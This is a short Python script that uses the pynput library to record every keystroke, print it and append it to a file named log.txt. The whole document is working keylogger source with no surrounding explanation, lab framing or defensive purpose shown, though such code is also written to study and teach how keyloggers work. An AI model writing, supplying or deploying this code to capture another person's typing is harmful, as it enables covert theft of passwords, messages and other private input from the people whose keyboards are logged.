from pynput import keyboard


def on_press(key):
    key = str(key).replace("'", "")
    print("{0}".format(key))
    write_file(key)


def on_release(key):
    pass


def write_file(key):
    with open("log.txt", "a") as file:
        if key.find("Key") >= 0:
            file.write("\n" + key + "\n")
        else:
            file.write(key)


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
